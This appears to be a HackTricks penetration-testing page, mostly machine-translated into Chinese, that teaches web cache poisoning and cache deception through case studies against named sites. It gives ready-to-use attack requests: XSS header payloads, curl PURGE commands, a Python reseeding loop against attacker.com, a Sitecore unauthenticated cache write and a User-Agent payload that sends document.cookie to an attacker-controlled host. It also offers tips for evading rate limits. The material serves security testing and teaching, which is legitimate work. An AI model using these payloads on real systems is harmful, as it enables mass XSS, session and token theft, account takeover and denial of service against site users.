# Cache Poisoning and Cache Deception

{{#include ../../banners/hacktricks-training.md}}

## 差异

> **What is the difference between web cache poisoning and web cache deception?**
>
> - In **web cache poisoning**, the attacker causes the application to store some malicious content in the cache, and this content is served from the cache to other application users.
> - In **web cache deception**, the attacker causes the application to store some sensitive content belonging to another user in the cache, and the attacker then retrieves this content from the cache.

## Cache Poisoning

Cache poisoning 旨在操纵客户端缓存，使客户端加载意外的、部分的或由攻击者控制的资源。影响范围取决于受影响页面的受欢迎程度，因为被污染的响应只会在缓存污染期间提供给访问该页面的用户。

执行 cache poisoning 攻击通常包含几个步骤：

1. **Identification of Unkeyed Inputs**：这些是虽然不是缓存请求所必需，但可以改变服务器返回的响应的参数。识别这些输入很重要，因为它们可以被利用来操纵缓存。
2. **Exploitation of the Unkeyed Inputs**：在识别出未键控的输入后，下一步是弄清如何滥用这些参数，以使服务器的响应以有利于攻击者的方式发生改变。
3. **Ensuring the Poisoned Response is Cached**：最后一步是确保被篡改的响应被存入缓存。这样，任何在缓存被污染期间访问受影响页面的用户都会收到被污染的响应。

### 发现：检查 HTTP headers

通常，当响应被**存储在缓存中**时，会有一个**指示的 header**，你可以在这篇文章中查看应该关注哪些 header：[**HTTP Cache headers**](../../network-services-pentesting/pentesting-web/special-http-headers.md#cache-headers)。

### 发现：缓存错误代码

如果你认为响应被存储在缓存中，可以尝试**发送带有错误 header 的请求**，服务器应以**状态码 400**响应。然后尝试正常访问该请求，如果**响应是 400 状态码**，则说明存在漏洞（你甚至可以执行 DoS）。

你可以在以下位置找到更多选项：


{{#ref}}
cache-poisoning-to-dos.md
{{#endref}}

但是，请注意，有时这类状态码不会被缓存，所以这个测试可能不可靠。

### 发现：识别并评估未键控的输入

你可以使用 [**Param Miner**](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943) 来**暴力枚举可能改变页面响应的参数和 headers**。例如，一个页面可能使用 header `X-Forwarded-For` 来指示客户端从那里加载脚本：
```html
<script type="text/javascript" src="//<X-Forwarded-For_value>/resources/js/tracking.js"></script>
```
### 诱导后端服务器返回有害响应

在识别出可控的参数/头之后，检查它如何被**清理**以及它**在哪里**被**反射**或如何影响响应。你能否滥用它（执行 XSS 或加载你控制的 JS 代码？发起 DoS？...）

### 使响应被缓存

一旦你**确定**了可被滥用的**页面**、要使用的**参数**/**头**以及**如何**滥用它，就需要让该页面进入缓存。根据你试图缓存的资源不同，这可能需要一些时间，可能需要尝试数秒钟。

响应中的头 **`X-Cache`** 非常有用，当请求未被缓存时可能为 **`miss`**，当已被缓存时则为 **`hit`**.\
头 **`Cache-Control`** 也很有用，用于判断资源是否被缓存以及下次缓存将于何时（例如：`Cache-Control: public, max-age=1800`）。

另一个有趣的头是 **`Vary`**。该头通常用于**指示额外的头**会被视为**缓存键的一部分**，即便它们通常不被作为键。因此，如果攻击者知道目标受害者的 `User-Agent`，就可以 poison the cache 针对使用该特定 `User-Agent` 的用户。

另一个与缓存相关的头是 **`Age`**。它表示对象在代理缓存中存在的时间（秒）。

在缓存请求时，要**小心你使用的头**，因为某些头可能会**意外地被用作键**，而**受害者需要使用相同的头**。始终 **test** a Cache Poisoning 用 **不同的浏览器** 来检查它是否有效。

### 基础的 cache poisoning 案例研究

#### HackerOne 通过 `X-Forwarded-Host` 的全局重定向

- 源端使用 `X-Forwarded-Host` 模板化地生成重定向和 canonical URL，但缓存键只使用了 `Host` 头，因此单个响应就 poisoned 了所有访问 `/` 的用户。
- Poison with:
```http
GET / HTTP/1.1
Host: hackerone.com
X-Forwarded-Host: evil.com
```
- 立即重新请求 `/`，不要带伪造的 header；如果 redirect 仍然存在，说明你拥有一个全局的 host-spoofing primitive，它常常会将 reflected redirects/Open Graph links 升级为 stored issues。

#### GitHub 存储库 DoS（通过 `Content-Type` + `PURGE`）

- 匿名流量仅以路径作为 key，而后端在看到意外的 `Content-Type` 时会进入错误状态。该错误响应是可被缓存的，影响每个 repo 的未认证用户。
- GitHub 还（意外地）支持 `PURGE` verb，允许 attacker 清除一个健康条目并强制缓存按需拉取被污染的变体：
```bash
curl -H "Content-Type: invalid-value" https://github.com/user/repo
curl -X PURGE https://github.com/user/repo
```
- 始终比较 authenticated 和 anonymous 的 cache keys，对很少作为 key 的 headers（例如 `Content-Type`）进行 fuzz，并探测暴露的 cache-maintenance verbs 以自动化 re-poisoning。

#### Shopify 跨主机持久性循环

- 多层缓存有时需要多次相同的命中才能提交新的对象。Shopify 在多个本地化主机间重用相同的缓存，因此持久性会影响许多站点/属性。
- 使用短的 automation loops 反复 reseed：
```python
import requests, time
for i in range(100):
requests.get("https://shop.shopify.com/endpoint",
headers={"X-Forwarded-Host": "attacker.com"})
time.sleep(0.1)
print("attacker.com" in requests.get("https://shop.shopify.com/endpoint").text)
```
- 在获得 `hit` 响应后，爬取共享相同缓存命名空间的其他主机/资产，以演示跨域影响范围。

#### JS 资产重定向 → stored XSS 链

- 私有项目通常在数十个子域上托管共享的 JS（例如 `/assets/main.js`）。如果 `X-Forwarded-Host` 影响这些资源的重定向逻辑但未被用作缓存键，缓存的响应会变成指向攻击者 JS 的 301 重定向，从而在该资源被导入的所有地方产生 stored XSS。
```http
GET /assets/main.js HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
```
- 映射哪些主机重用相同的 asset path，以便你可以证明 multi-subdomain compromise。

#### GitLab 静态 DoS 通过 `X-HTTP-Method-Override`

- GitLab 从 Google Cloud Storage 提供静态 bundles，后者会遵循 `X-HTTP-Method-Override`。将 GET 覆盖为 HEAD 会返回可缓存的 `200 OK` 且带有 `Content-Length: 0`，并且边缘缓存在生成 key 时忽略 HTTP method。
```http
GET /static/app.js HTTP/1.1
Host: gitlab.com
X-HTTP-Method-Override: HEAD
```
- 单次请求将 JS bundle 的响应体替换为空，从而对每个 GET 有效地 DoSing UI。务必在静态资源上测试 method overrides (`X-HTTP-Method-Override`, `X-Method-Override`, 等) 并确认缓存是否会根据 HTTP method 而变化。

#### HackerOne 静态资源循环（通过 `X-Forwarded-Scheme``）

- Rails 的 Rack 中间件信任 `X-Forwarded-Scheme` 来决定是否强制 HTTPS。对 `/static/logo.png` 伪造 `http` 会触发可缓存的 301，因此所有用户随后收到的是重定向（或循环），而不是该资源：
```http
GET /static/logo.png HTTP/1.1
Host: hackerone.com
X-Forwarded-Scheme: http
```
- 在可能时将 scheme spoofing 与 host spoofing 结合，以为高度可见的资源构造不可逆的重定向。

#### Cloudflare host-header casing mismatch

- Cloudflare 会将 `Host` 头规范化用于 cache keys，但会将原始大小写转发到 origins。发送 `Host: TaRgEt.CoM` 会在 origin routing/templating 中触发不同的行为，同时仍会填充规范的小写 cache bucket。
```http
GET / HTTP/1.1
Host: TaRgEt.CoM
```
- 通过重放 mixed-case hosts（和其他 normalized headers），并对 cached response 与 origin response 做 diff，以枚举 CDN 租户并发现 shared-platform cache poisonings。

#### Red Hat Open Graph meta poisoning

- 在 Open Graph tags 内注入 `X-Forwarded-Host` 会在 CDN 缓存页面后，将一次 reflected HTML injection 变成 stored XSS。测试时使用无害的 cache buster 以避免影响 production users：
```http
GET /en?dontpoisoneveryone=1 HTTP/1.1
Host: www.redhat.com
X-Forwarded-Host: a."?><script>alert(1)</script>
```
- 社交媒体抓取器会消费缓存的 Open Graph 标签，因此单个 poisoned entry 会把 payload 分发得远超直接访客。

## 利用示例

### 最简单的示例

像 `X-Forwarded-For` 这样的请求头在响应中未经消毒地被反射。\
你可以发送一个基本的 XSS payload 并 poison the cache，这样所有访问该页面的人都会被 XSSed：
```html
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"
```
_注意：这将污染对 `/en?region=uk` 的请求，而不是对 `/en` 的请求_

### Cache poisoning to DoS


{{#ref}}
cache-poisoning-to-dos.md
{{#endref}}

### Cache poisoning through CDNs

In **[this writeup](https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html)** it's explained the following simple scenario:

- CDN 会缓存 `/share/` 下的所有内容
- CDN 不会解码或规范化 `%2F..%2F`，因此它可以被用作 **path traversal 来访问将被缓存的其他敏感位置**，例如 `https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123`
- Web 服务器会解码并规范化 `%2F..%2F`，并会响应 `/api/auth/session`，该响应 **包含 auth token**。

### Using web cache poisoning to exploit cookie-handling vulnerabilities

Cookies 也可能在页面响应中被反射。如果你能滥用它触发 XSS，例如，你就可能在多个加载恶意缓存响应的客户端中利用该 XSS。
```html
GET / HTTP/1.1
Host: vulnerable.com
Cookie: session=VftzO7ZtiBj5zNLRAuFpXpSQLjS4lBmU; fehost=asd"%2balert(1)%2b"
```
请注意，如果易受攻击的 cookie 被用户频繁使用，常规请求会清理缓存。

### Generating discrepancies with delimiters, normalization and dots <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

Check:


{{#ref}}
cache-poisoning-via-url-discrepancies.md
{{#endref}}

### Cache poisoning with path traversal to steal API key <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

[**This writeup explains**](https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html) how it was possible to steal an OpenAI API key with an URL like `https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123` because anything matching `/share/*` will be cached without Cloudflare normalising the URL, which was done when the request reached the web server.

This is also explained better in:


{{#ref}}
cache-poisoning-via-url-discrepancies.md
{{#endref}}

### Using multiple headers to exploit web cache poisoning vulnerabilities <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

有时你需要 **利用多个未作为缓存键的输入** 来滥用缓存。例如，如果你将 `X-Forwarded-Host` 设置为你控制的域名并将 `X-Forwarded-Scheme` 设置为 `http`，你可能会发现一个 **Open redirect**。**如果** **服务器** 正在 **转发** 所有 **HTTP** 请求 **到 HTTPS** 并使用头部 `X-Forwarded-Scheme` 作为重定向的域名，你就可以控制重定向指向的位置。
```html
GET /resources/js/tracking.js HTTP/1.1
Host: acc11fe01f16f89c80556c2b0056002e.web-security-academy.net
X-Forwarded-Host: ac8e1f8f1fb1f8cb80586c1d01d500d3.web-security-academy.net/
X-Forwarded-Scheme: http
```
### 利用受限的 `Vary` 头

如果你发现 **`X-Host`** header 被用作 **域名来加载 JS 资源**，但响应中的 **`Vary`** header 指示的是 **`User-Agent`**。那么，你需要找到一种方法来 exfiltrate 受害者的 User-Agent，并使用该 User-Agent 来 poison the cache：
```html
GET / HTTP/1.1
Host: vulnerbale.net
User-Agent: THE SPECIAL USER-AGENT OF THE VICTIM
X-Host: attacker.com
```
### Fat Get

发送一个 GET 请求，同时在 URL 和请求体 中包含相同的请求。 如果 web 服务器 使用请求体中的内容但缓存服务器 缓存了 URL 中的内容，那么任何访问该 URL 的人实际上会使用来自请求体的参数。 例如 James Kettle 在 Github 网站上发现的那个 vuln：
```
GET /contact/report-abuse?report=albinowax HTTP/1.1
Host: github.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

report=innocent-victim
```
这里有一个 portswigger lab： [https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get)

### Parameter Cloacking

例如，在 ruby servers 中可以使用字符 **`;`** 而不是 **`&`** 来分隔 **parameters**。这可以被用来将无键参数的值放入有键参数中并滥用它们。

Portswigger lab: [https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking)

### Exploiting HTTP Cache Poisoning by abusing HTTP Request Smuggling

在这里了解如何执行 [Cache Poisoning attacks by abusing HTTP Request Smuggling](../http-request-smuggling/index.html#using-http-request-smuggling-to-perform-web-cache-poisoning)。

### Automated testing for Web Cache Poisoning

[Web Cache Vulnerability Scanner](https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner) 可以用于自动测试 web cache poisoning。它支持许多不同的技术并且高度可定制。

示例用法： `wcvs -u example.com`

### Header-reflection XSS + CDN/WAF-assisted cache seeding (User-Agent, auto-cached .js)

这种真实世界的模式将 header-based reflection primitive 与 CDN/WAF 行为串联起来，以可靠地 poison 被缓存的 HTML 并提供给其他用户：

- 主 HTML 将不受信任的请求头（例如 `User-Agent`）反射到可执行上下文。
- CDN 去除了 cache headers，但存在内部/源缓存。CDN 还会自动缓存以静态扩展名结尾的请求（例如 `.js`），而 WAF 对用于静态资产的 GET 的内容检测较弱。
- 请求流的奇异性允许对 `.js` 路径的请求影响随后主 HTML 使用的 cache key/variant，从而通过 header reflection 实现跨用户 XSS。

Practical recipe (observed across a popular CDN/WAF):

1) 从干净的 IP（避免之前基于声誉的降级），通过浏览器或 Burp Proxy Match & Replace 设置恶意的 `User-Agent`。
2) 在 Burp Repeater 中，准备一组两个请求并使用 "Send group in parallel" (single-packet mode works best):
- 第一请求：在相同源上 GET 一个 `.js` 资源路径，同时发送你的恶意 `User-Agent`。
- 紧接着：GET 主页面 (`/`)。
3) CDN/WAF 的路由竞争加上自动缓存的 `.js` 常常会在缓存中播种出被 poisoned 的 HTML 变体，该变体随后会被其他满足相同 cache key 条件（例如相同的 `Vary` 维度如 `User-Agent`）的访问者获取。

Example header payload (to exfiltrate non-HttpOnly cookies):
```http
User-Agent: Mo00ozilla/5.0</script><script>new Image().src='https://attacker.oastify.com?a='+document.cookie</script>"
```
Operational tips:

- Many CDNs hide cache headers; poisoning may appear only on multi-hour refresh cycles. Use multiple vantage IPs and throttle to avoid rate-limit or reputation triggers.
- Using an IP from the CDN's own cloud sometimes improves routing consistency.
- If a strict CSP is present, this still works if the reflection executes in main HTML context and CSP allows inline execution or is bypassed by context.

Impact:

- If session cookies aren’t `HttpOnly`, zero-click ATO is possible by mass-exfiltrating `document.cookie` from all users who are served the poisoned HTML.


### Sitecore pre‑auth HTML cache poisoning (unsafe XAML Ajax reflection)

一个 Sitecore 特有的模式允许通过滥用 pre‑auth XAML handlers 和 AjaxScriptManager reflection 对 HtmlCache 进行未认证的写入。当达到 `Sitecore.Shell.Xaml.WebControl` handler 时，会有一个 `xmlcontrol:GlobalHeader`（派生自 `Sitecore.Web.UI.WebControl`）可用，并且允许以下反射调用：
```http
POST /-/xaml/Sitecore.Shell.Xaml.WebControl
Content-Type: application/x-www-form-urlencoded

__PARAMETERS=AddToCache("key","<html>…payload…</html>")&__SOURCE=ctl00_ctl00_ctl05_ctl03&__ISEVENT=1
```
This 会在攻击者选择的 cache key 下写入任意 HTML，一旦已知 cache keys 就可以进行精确的 poisoning。

For full details (cache key construction, ItemService enumeration and a chained post‑auth deserialization RCE):

{{#ref}}
../../network-services-pentesting/pentesting-web/sitecore/README.md
{{#endref}}

## 易受攻击的示例

### Apache Traffic Server ([CVE-2021-27577](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27577))

ATS 会将 URL 中的 fragment 转发给后端而不进行剥离，并且只使用 host、path 和 query（忽略 fragment）来生成 cache key。 所以请求 `/#/../?r=javascript:alert(1)` 会以 `/#/../?r=javascript:alert(1)` 发送到后端，而 cache key 中没有包含 payload，只有 host、path 和 query。

### 403 与存储桶

Cloudflare 以前会缓存 403 响应。使用错误的 Authorization headers 访问 S3 或 Azure Storage Blobs 会返回一个被缓存的 403 响应。尽管 Cloudflare 已停止缓存 403 响应，但其他代理服务中仍可能存在此类行为。

### 注入带键参数

Caches 常在 cache key 中包含特定的 GET 参数。比如，Fastly 的 Varnish 会在请求中缓存 `size` 参数。然后，如果同时发送了参数的 URL-encoded 版本（例如 `siz%65`）且带有错误的值，cache key 会使用正确的 `size` 参数来构造。但后端会处理 URL-encoded 参数中的值。对第二个 `size` 参数进行 URL-encoding 会导致 cache 忽略它，但后端仍会使用它。将该参数赋值为 0 会导致产生可缓存的 400 Bad Request 错误。

### User Agent 规则

一些开发者为控制服务器负载，会阻止 user-agents 与高流量工具（如 FFUF 或 Nuclei）匹配的请求。具有讽刺意味的是，这种做法可能引入缓存 poisoning 和 DoS 等漏洞。

### 非法 Header 字段

[RFC7230](https://datatracker.ietf.mrg/doc/html/rfc7230) 指定了 header 名称中可接受的字符。包含超出 **tchar** 范围字符的 headers 理论上应该触发 400 Bad Request 响应。实际上，服务器并不总是遵守此标准。一个显著的例子是 Akamai：它会转发包含非法字符的 headers，并缓存任何 400 错误，只要 `cache-control` header 不存在。发现了一个可被利用的模式：发送包含非法字符（例如 `\`）的 header 会导致产生可缓存的 400 Bad Request 错误。

### 发现新 header

[https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6](https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6)

## Cache Deception

The goal of Cache Deception is to make clients **load resources that are going to be saved by the cache with their sensitive information**.

首先注意，像 `.css`、`.js`、`.png` 等扩展名通常被配置为会被保存到 cache 中。因此，如果你访问 `www.example.com/profile.php/nonexistent.js`，cache 很可能会存储该响应，因为它看到的是 `.js` 扩展名。 但是，如果应用在回应中重放存储在 _www.example.com/profile.php_ 的敏感用户内容，你就可以从其他用户那里窃取这些内容。

其他值得测试的项：

- _www.example.com/profile.php/.js_
- _www.example.com/profile.php/.css_
- _www.example.com/profile.php/test.js_
- _www.example.com/profile.php/../test.js_
- _www.example.com/profile.php/%2e%2e/test.js_
- _使用不那么常见的扩展例如_ `.avif`

另一个非常清晰的示例可以在这篇 write-up 中找到： [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712).\
在该示例中，解释了如果你加载一个不存在的页面比如 _http://www.example.com/home.php/non-existent.css_，那么 _http://www.example.com/home.php_ （**包含用户的敏感信息**）的内容将被返回并且 cache server 会保存该结果。\
随后，**攻击者** 可以在自己的浏览器中访问 _http://www.example.com/home.php/non-existent.css_，从而观察到之前访问过该页面的用户的**机密信息**。

注意，**cache proxy** 应该是基于文件的扩展名（_.css_）来配置缓存，而不是基于 content-type。在该示例中，_http://www.example.com/home.php/non-existent.css_ 的 content-type 将会是 `text/html`，而不是 `text/css`。

Learn here about how to perform[ Cache Deceptions attacks abusing HTTP Request Smuggling](../http-request-smuggling/index.html#using-http-request-smuggling-to-perform-web-cache-deception).

### CSPT-assisted authenticated cache poisoning (Account Takeover)

此模式将 Single-Page App (SPA) 中的 Client-Side Path Traversal (CSPT) 原语与基于扩展名的 CDN 缓存结合起来，使原本仅通过认证 API 调用可得的敏感 JSON 被公开缓存。

高层思路：

- 一个敏感的 API 端点需要自定义的 auth header，并且在 origin 被正确标记为不可缓存。
- 在路径末尾追加一个静态看起来的后缀（例如 .css）会使 CDN 将该路径视为静态资源并缓存响应，通常不会对敏感 header 进行变更（vary）。
- SPA 包含 CSPT：它将用户可控的路径片段拼接到 API URL 上，同时附带受害者的 auth header（例如 X-Auth-Token）。通过注入 ../.. 的 traversal，认证的 fetch 会被重定向到可缓存的路径变体（…/v1/token.css），导致 CDN 在公共 key 下缓存受害者的 token JSON。
- 任何人随后都可以在不认证的情况下 GET 同一 cache key 并检索受害者的 token。

Example

- Sensitive endpoint (non-cacheable at origin):
```
GET /v1/token HTTP/1.1
Host: api.example.com
X-Auth-Token: <REDACTED>
Accept: application/json

HTTP/1.1 200 OK
Content-Type: application/json
Cache-Control: no-cache, no-store, must-revalidate
X-Cache: Miss from cdn

{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."}
```
- 看起来静态的后缀会使 CDN 变为可缓存：
```
GET /v1/token.css HTTP/1.1
Host: api.example.com
X-Auth-Token: <REDACTED>
Accept: application/json

HTTP/1.1 200 OK
Content-Type: application/json
Cache-Control: max-age=86400, public
X-Cache: Hit from cdn

{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."}
```
- CSPT 在 SPA 中附加 auth header 并允许 traversal:
```js
const urlParams = new URLSearchParams(window.location.search);
const userId = urlParams.get('userId');

const apiUrl = `https://api.example.com/v1/users/info/${userId}`;

fetch(apiUrl, {
method: 'GET',
headers: { 'X-Auth-Token': authToken }
});
```
- 利用链：
1. 引诱受害者访问一个在 SPA path 参数中注入 dot-segments 的 URL，例如：
- [https://example.com/user?userId=../../../v1/token.css](https://example.com/user?userId=../../../v1/token.css)
2. SPA 发起已认证的 fetch 到：
- [https://api.example.com/v1/users/info/../../../v1/token.css](https://api.example.com/v1/users/info/../../../v1/token.css)
3. 浏览器规范化将其解析为：
- [https://api.example.com/v1/token.css](https://api.example.com/v1/token.css)
4. CDN 将 .css 视为静态资源并使用 Cache-Control: public, max-age=... 缓存该 JSON。
5. 公开检索：任何人都可以 GET https://api.example.com/v1/token.css 并获取缓存的 token JSON。

Preconditions

- SPA 执行对相同 API origin 的已认证 fetch/XHR（或在跨域且 CORS 生效时）并附加敏感 headers 或 bearer tokens。
- Edge/CDN 对看起来像静态的路径应用基于扩展名的缓存（例如 *.css, *.js, images），并且在敏感 header 上不改变缓存键。
- 基础端点的 origin 是不可缓存的（正确），但带扩展名后缀的变体被允许或未被边缘规则阻止。

Validation checklist

- 识别敏感的动态端点并尝试类似 .css, .js, .jpg, .json 的后缀。观察是否存在 Cache-Control: public/max-age 和 X-Cache: Hit（或等价，例如 CF-Cache-Status），同时响应仍为 JSON。
- 定位将用户可控输入拼接到 API 路径并附加 auth headers 的客户端代码。注入 ../ 序列以将已认证请求重定向到目标端点。
- 确认重定向后的请求中包含已认证的 header（例如通过代理或服务器端日志），并且 CDN 在穿越的路径下缓存了该响应。
- 从一个新的上下文（无认证）请求相同路径，确认包含秘密的 JSON 是从缓存中返回的。

## 自动化工具

- [**toxicache**](https://github.com/xhzeem/toxicache): Golang scanner to find web cache poisoning vulnerabilities in a list of URLs and test multiple injection techniques.

## References

- [https://portswigger.net/web-security/web-cache-poisoning](https://portswigger.net/web-security/web-cache-poisoning)
- [https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities](https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities)
- [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712)
- [https://youst.in/posts/cache-poisoning-at-scale/](https://youst.in/posts/cache-poisoning-at-scale/)
- [https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9](https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9)
- [https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/](https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/)
- [How I found a 0-Click Account takeover in a public BBP and leveraged it to access Admin-Level functionalities](https://hesar101.github.io/posts/How-I-found-a-0-Click-Account-takeover-in-a-public-BBP-and-leveraged-It-to-access-Admin-Level-functionalities/)
- [Burp Proxy Match & Replace](https://portswigger.net/burp/documentation/desktop/tools/proxy/match-and-replace)
- [watchTowr Labs – Sitecore XP cache poisoning → RCE](https://labs.watchtowr.com/cache-me-if-you-can-sitecore-experience-platform-cache-poisoning-to-rce/)
- [Cache Deception + CSPT: Turning Non Impactful Findings into Account Takeover](https://zere.es/posts/cache-deception-cspt-account-takeover/)
- [CSPT overview by Matan Berson](https://matanber.com/blog/cspt-levels/)
- [CSPT presentation by Maxence Schmitt](https://www.youtube.com/watch?v=O1ZN_OCfNzg)
- [PortSwigger: Web Cache Deception](https://portswigger.net/web-security/web-cache-deception)
- [Cache Poisoning Case Studies Part 1: Foundational Attacks Behind a $100K+ Vulnerability Class](https://herish.me/blog/cache-poisoning-case-studies-part-1-foundational-attacks/)



{{#include ../../banners/hacktricks-training.md}}
